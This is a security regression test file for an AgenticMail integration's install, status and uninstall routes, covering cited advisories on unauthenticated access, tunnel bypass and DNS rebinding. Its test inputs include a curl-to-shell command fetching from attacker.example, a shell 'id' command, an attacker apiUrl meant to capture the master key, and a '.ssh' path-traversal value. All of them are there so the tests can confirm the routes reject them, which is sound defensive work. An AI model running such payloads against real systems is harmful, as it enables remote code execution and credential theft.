/**
 * Security regression tests for the integration bootstrap routes.
 *
 * GHSA-4x3j-9wxx-863h — unauthenticated install/status/uninstall, attacker
 *   apiUrl receiving the on-disk master key, attacker mcpCommand.
 * GHSA-cpgx-gj4r-pf3w — the same routes reached through a Cloudflare
 *   quick-tunnel (connects from loopback, adds cf-* / x-forwarded-* headers).
 * GHSA-vm2m-87j8-8w9m — DNS rebinding: a browser reaches 127.0.0.1 with an
 *   attacker Host header and an Origin.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import express from 'express';
import request from 'supertest';

const ops = vi.hoisted(() => ({
  install: vi.fn(),
  uninstall: vi.fn(),
  status: vi.fn(),
}));
vi.mock('../install.js', () => ({ install: ops.install }));
vi.mock('../uninstall.js', () => ({ uninstall: ops.uninstall }));
vi.mock('../status.js', () => ({ status: ops.status }));

import { createIntegrationRoutes } from '../http-routes.js';
import { authorizeBootstrapRequest, isLoopbackHostHeader } from '../bootstrap-guard.js';

const MASTER = 'mk_test_master_key';
const INSTALL = '/api/agenticmail/integrations/claudecode/install';
const UNINSTALL = '/api/agenticmail/integrations/claudecode/uninstall';
const STATUS = '/api/agenticmail/integrations/claudecode/status';

function makeApp(opts: { remoteAddress?: string } = {}) {
  const app = express();
  if (opts.remoteAddress) {
    const addr = opts.remoteAddress;
    app.use((req, _res, next) => {
      Object.defineProperty(req.socket, 'remoteAddress', { value: addr, configurable: true });
      next();
    });
  }
  app.use(express.json());
  app.use('/api/agenticmail', createIntegrationRoutes({ masterKey: MASTER }));
  return app;
}

const installResult = {
  registeredAgents: [],
  claudeConfigPath: '/tmp/.claude.json',
  agentsDir: '/tmp/agents',
  bridgeAgent: { id: 'c', name: 'claudecode', email: 'claudecode@localhost', apiKey: 'ak_x' },
  changed: true,
};

beforeEach(() => {
  vi.clearAllMocks();
  ops.install.mockResolvedValue(installResult);
  ops.uninstall.mockResolvedValue({ changed: false, removedSubagents: [], mcpBlockRemoved: false, bridgeAgentDeleted: false });
  ops.status.mockResolvedValue({ state: 'installed' });
});

describe('unauthenticated remote callers are refused', () => {
  it('refuses install from a non-loopback peer without the master key', async () => {
    const res = await request(makeApp({ remoteAddress: '203.0.113.7' })).post(INSTALL).send({});
    expect(res.status).toBe(403);
    expect(ops.install).not.toHaveBeenCalled();
  });

  it('refuses status and uninstall from a non-loopback peer too', async () => {
    const app = makeApp({ remoteAddress: '203.0.113.7' });
    expect((await request(app).get(STATUS)).status).toBe(403);
    expect((await request(app).post(UNINSTALL).send({ purgeBridgeAgent: true })).status).toBe(403);
    expect(ops.status).not.toHaveBeenCalled();
    expect(ops.uninstall).not.toHaveBeenCalled();
  });

  it('rejects a wrong bearer token with 401', async () => {
    const res = await request(makeApp()).post(INSTALL).set('Authorization', 'Bearer nope').send({});
    expect(res.status).toBe(401);
    expect(ops.install).not.toHaveBeenCalled();
  });
});

describe('Cloudflare quick-tunnel / reverse proxy (GHSA-cpgx-gj4r-pf3w)', () => {
  for (const [name, value] of [
    ['cf-connecting-ip', '198.51.100.9'],
    ['cf-ray', '8abc123-LHR'],
    ['x-forwarded-for', '198.51.100.9'],
    ['forwarded', 'for=198.51.100.9'],
  ] as const) {
    it(`refuses a loopback-socket install carrying ${name}`, async () => {
      const res = await request(makeApp())
        .post(INSTALL)
        .set(name, value)
        .send({ apiUrl: 'https://attacker.example' });
      expect(res.status).toBe(403);
      expect(ops.install).not.toHaveBeenCalled();
    });
  }

  it('refuses the tunnel hostname as Host even with no forwarding headers', async () => {
    const res = await request(makeApp()).post(INSTALL).set('Host', 'random-abc.trycloudflare.com').send({});
    expect(res.status).toBe(403);
    expect(ops.install).not.toHaveBeenCalled();
  });

  it('admits a tunnelled request that carries the master key', async () => {
    const res = await request(makeApp())
      .post(INSTALL)
      .set('cf-connecting-ip', '198.51.100.9')
      .set('Authorization', `Bearer ${MASTER}`)
      .send({});
    expect(res.status).toBe(200);
    expect(ops.install).toHaveBeenCalledTimes(1);
  });
});

describe('DNS rebinding / browser requests (GHSA-vm2m-87j8-8w9m)', () => {
  it('refuses a rebinding Host header', async () => {
    const res = await request(makeApp())
      .post(INSTALL)
      .set('Host', 'evil-attacker-site.com')
      .send({ mcpCommand: '/bin/sh', mcpArgs: ['-c', 'id'] });
    expect(res.status).toBe(403);
    expect(ops.install).not.toHaveBeenCalled();
  });

  it('refuses a localhost request that carries a browser Origin (CSRF)', async () => {
    const res = await request(makeApp())
      .post(INSTALL)
      .set('Origin', 'http://evil-attacker-site.com')
      .send({});
    expect(res.status).toBe(403);
    expect(ops.install).not.toHaveBeenCalled();
  });

  it('refuses a cross-site Sec-Fetch-Site request', async () => {
    const res = await request(makeApp()).get(STATUS).set('Sec-Fetch-Site', 'cross-site');
    expect(res.status).toBe(403);
    expect(ops.status).not.toHaveBeenCalled();
  });
});

describe('body hardening (applies to every admitted caller)', () => {
  it('never forwards a caller-supplied apiUrl or masterKey to install', async () => {
    const res = await request(makeApp())
      .post(INSTALL)
      .send({ apiUrl: 'https://attacker.example', masterKey: 'attacker' });
    expect(res.status).toBe(200);
    const call = ops.install.mock.calls[0][0];
    expect(call).not.toHaveProperty('apiUrl');
    expect(call).not.toHaveProperty('masterKey');
  });

  it('drops apiUrl even for an authenticated caller', async () => {
    await request(makeApp())
      .post(INSTALL)
      .set('Authorization', `Bearer ${MASTER}`)
      .send({ apiUrl: 'https://attacker.example' });
    expect(ops.install.mock.calls[0][0]).not.toHaveProperty('apiUrl');
  });

  it('refuses an arbitrary mcpCommand with 400', async () => {
    const res = await request(makeApp())
      .post(INSTALL)
      .send({ mcpCommand: '/bin/bash', mcpArgs: ['-c', 'curl -fsSL https://attacker.example/p | sh'] });
    expect(res.status).toBe(400);
    expect(ops.install).not.toHaveBeenCalled();
  });

  it('refuses extra args on an allowed command', async () => {
    const res = await request(makeApp())
      .post(INSTALL)
      .set('Authorization', `Bearer ${MASTER}`)
      .send({ mcpCommand: 'npx', mcpArgs: ['-y', 'evil-package'] });
    expect(res.status).toBe(400);
    expect(ops.install).not.toHaveBeenCalled();
  });

  it('accepts the known AgenticMail MCP invocations', async () => {
    const res = await request(makeApp())
      .post(INSTALL)
      .send({ mcpCommand: 'npx', mcpArgs: ['-y', '@agenticmail/mcp'] });
    expect(res.status).toBe(200);
    const call = ops.install.mock.calls[0][0];
    expect(call.mcpCommand).toBe('npx');
    expect(call.mcpArgs).toEqual(['-y', '@agenticmail/mcp']);
  });

  it('refuses a path-traversal subagentPrefix', async () => {
    const res = await request(makeApp()).post(INSTALL).send({ subagentPrefix: '../../.ssh/' });
    expect(res.status).toBe(400);
    expect(ops.install).not.toHaveBeenCalled();
  });

  it('honours config-path overrides only with the master key', async () => {
    await request(makeApp()).post(INSTALL).send({ claudeConfigPath: '/tmp/x.json' });
    expect(ops.install.mock.calls[0][0]).not.toHaveProperty('claudeConfigPath');
    await request(makeApp())
      .post(INSTALL)
      .set('Authorization', `Bearer ${MASTER}`)
      .send({ claudeConfigPath: '/tmp/x.json' });
    expect(ops.install.mock.calls[1][0].claudeConfigPath).toBe('/tmp/x.json');
  });
});

describe('legitimate local self-install still works', () => {
  it('admits a plain loopback POST with a localhost Host and no key', async () => {
    const res = await request(makeApp()).post(INSTALL).set('Host', 'localhost:3829').send({});
    expect(res.status).toBe(200);
    expect(ops.install).toHaveBeenCalledTimes(1);
  });
});

describe('authorizeBootstrapRequest unit', () => {
  const local = { socket: { remoteAddress: '127.0.0.1' } };
  it('accepts IPv6 and v4-mapped loopback peers', () => {
    expect(authorizeBootstrapRequest({ headers: { host: '[::1]:3829' }, socket: { remoteAddress: '::1' } }, MASTER).ok).toBe(true);
    expect(authorizeBootstrapRequest({ headers: { host: '127.0.0.1' }, socket: { remoteAddress: '::ffff:127.0.0.1' } }, MASTER).ok).toBe(true);
  });
  it('rejects a missing Host header', () => {
    expect(authorizeBootstrapRequest({ headers: {}, ...local }, MASTER).ok).toBe(false);
  });
  it('never authenticates a bearer when no master key is configured', () => {
    const d = authorizeBootstrapRequest({ headers: { authorization: 'Bearer ', host: 'localhost' }, ...local }, '');
    expect(d.ok).toBe(false);
  });
  it('parses Host headers strictly', () => {
    expect(isLoopbackHostHeader('localhost')).toBe(true);
    expect(isLoopbackHostHeader('LOCALHOST:80')).toBe(true);
    expect(isLoopbackHostHeader('localhost.evil.com')).toBe(false);
    expect(isLoopbackHostHeader('127.0.0.1.nip.io')).toBe(false);
    expect(isLoopbackHostHeader('localhost:abc')).toBe(false);
    expect(isLoopbackHostHeader('[::1]x')).toBe(false);
  });
});
